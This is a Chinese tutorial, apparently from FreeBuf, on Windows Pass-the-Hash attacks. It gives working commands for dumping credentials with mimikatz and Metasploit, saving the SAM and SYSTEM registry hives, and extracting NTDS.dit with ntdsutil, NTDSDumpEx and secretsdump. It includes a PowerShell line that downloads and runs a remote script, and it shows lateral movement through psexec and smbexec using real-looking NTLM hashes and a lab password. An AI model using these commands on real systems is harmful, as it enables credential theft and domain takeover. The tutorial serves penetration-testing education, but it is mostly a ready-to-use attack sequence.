@@ -1,0 +1,167 @@
+**PTH，即Pass-The-Hash，首先我们来说下为什么要使用HASH传递，一是再目标机 >=win server
+2012时，lsass.exe进程中是抓不到明文密码的，二是随着信息安全意识的提高，弱口令情况逐渐降低，我们经常会遇到拿到hash却解不开的情况，综上，只有hash，我们依然可以正常登录。**
+
+PTH攻击最酷的地方并不是hash传递利用的过程，而是hash的获取过程，所以接下来90%的篇幅为hash获取的内容，开工！
+
+##  Hash获取
+
+###  普通PC的Hash获取
+
+一、神器mimikatz的本地抓取必须提一下，但你首先得拥有本地管理员的执行的权限。
+
+    
+    
+    privilege::debug
+    sekurlsa::logonpasswords
+
+二、Nishang，powershell的代表，我们之前讲过的，它也是具备获取hash的能力的，我们再来回顾下：
+
+    
+    
+    powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.15.216:8888/Gather/Get-PassHashes.ps1');Get-PassHashes
+
+![](https://image.3001.net/images/20191022/1571757163_5daf1c6b9b467.png!small)
+
+三、个人钟爱的msf，我们来梳理下msf支持多少中hash获取方式。
+
+> hashdump
+>
+> run hashdump
+>
+> run post/windows/gather/smart_hashdump
+>
+> 除了meterpreter自带的，还可以通过加载mimikatz获得：
+>
+> load mimikatz（必须，否则无以下命令）
+>
+> msv
+>
+> tspkg
+>
+> wdigest
+>
+> kerberos
+>
+> ssp
+
+对应字段如下，着重提下ssp，之前没留意这个字段，今天才发现记录的居然是ipc$的密码，惊，因为小伙伴刚刚传过文件，所以这里有记录了，所以给打个码。
+
+![](https://image.3001.net/images/20191022/1571757191_5daf1c879e766.png!small)
+
+mimikatz的原生命令在这里有些不在适用，但记得hash获取命令：mimikatz_command -f samdump::hashes
+
+![](https://image.3001.net/images/20191022/1571757232_5daf1cb0e2454.png!small)
+
+四、SAM表获取hash
+
+导出SAM数据：
+
+    
+    
+    reg save HKLM\SYSTEM SYSTEM
+    reg save HKLM\SAM SAM
+
+使用mimikatz提取hash：
+
+    
+    
+    lsadump::sam /sam:SAM /system:SYSTEM
+
+![](https://image.3001.net/images/20191022/1571757263_5daf1ccf0e42d.png!small)
+
+###  域的Hash获取
+
+首先同普通PC的Hash获取思路，但是不一样的是，你要晓得两件事情
+
+>
+> 一：即使是DC，常规获取hash的思路你依然只能获取本地用户的hash，并不能获取整个域的用户hash，当然，你依然可以拿到域管理员的hash，确实也有了登录整个域的权限。
+>
+> 二：即使是域内用户机，常规获取hash的思路依然有可能拿到域管理员的hash，只要域管理员通过RDP登录过，就会将hash保存到lsass中。
+
+NTDS.dit获取域控hash
+
+这个思路在域渗透中尤为重要，因为这里面包含着所有域用户的hash，当然该思路只对DC生效。
+
+手动导出NTDS.dit和System-hive，本地或目标机导hash，因为，如果域足够大，该文件也会特别大。
+
+除了手动找路径，可以参见下面的导出命令：
+
+    
+    
+    ntdsutil "ac i ntds" ifm "create full c:\users\tmp" q q
+
+我这里域用户只有几个，文件高达36M。
+
+![](https://image.3001.net/images/20191022/1571757280_5daf1ce0a2bbf.png!small)
+
+接下来我们需要提取用户hash,推荐NTDSDumpEx：
+
+工具地址：[https://github.com/zcgonvh/NTDSDumpEx/releases](https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fzcgonvh%2FNTDSDumpEx%2Freleases)
+
+    
+    
+    NTDSDumpEx -d ntds.dit -s system -o domain.txt
+
+![](https://image.3001.net/images/20191022/1571757314_5daf1d0242611.png!small)
+
+同样，再推荐个工具，还是我们多次提到过的python第三方库impacket下的secretsdump。
+
+    
+    
+    python secretsdump.py -system SYSTEM -ntds ntds.dit local
+
+![](https://image.3001.net/images/20191022/1571757381_5daf1d4517f10.png!small)
+
+secretsdump脚本直接导出域hash
+
+为什么要再提一遍secretsdump呢，因为它可以直接导出，说白了，就是把我们的手工任务自动执行一边，放在最后说也是为了让大家明白它的工作原理。
+
+    
+    
+    python secretsdump.py rabbitmask:1q2w3e4r!@192.168.15.181
+
+首先它会导出本地SAM中的hash：
+
+![](https://image.3001.net/images/20191022/1571757406_5daf1d5ee8ee7.png!small)
+
+然后是所有域内用户的IP，全部获取成功。
+
+![](https://image.3001.net/images/20191022/1571757426_5daf1d72d86f0.png!small)
+
+##  Hash传递
+
+首先恭喜在读的你，终于熬到了扣题的环节，这里我们提两种方式。
+
+###  msf_psexec模块
+
+    
+    
+    use exploit/windows/smb/psexec
+    set rhosts 192.168.15.181
+    set smbuser rabbitmask
+    set smbpass aad3b435b51404eeaad3b435b51404ee:0515322a55615056aaabb044a48463a4
+
+![](https://image.3001.net/images/20191022/1571757449_5daf1d89bf0f1.png!small)
+
+###  impacket_smbexec
+
+    
+    
+    python smbexec.py -hash esaad3b435b51404eeaad3b435b51404ee:0515322a55615056aaabb044a48463a4 rabbitmask@192.168.15.181
+
+or
+
+    
+    
+    python smbexec.py -hashes :0515322a55615056aaabb044a48463a4 rabbitmask@192.168.15.181
+
+显然，其实它只需要NThash部分就好啦。
+
+![](https://image.3001.net/images/20191022/1571757480_5daf1da89b3d8.png!small)
+
+##  END
+
+这就是内网渗透中的PTH操作，与其说是漏洞，其实他是验证逻辑中的一部分，希望本文可以提供给域管一些来自对立面的加固思路，感谢一位不愿透露姓名内网渗透大佬的全程指导，鞠躬。
+
+ ***本文原创作者：rabbitmask，本文属于FreeBuf原创奖励计划，未经许可禁止转载**
+
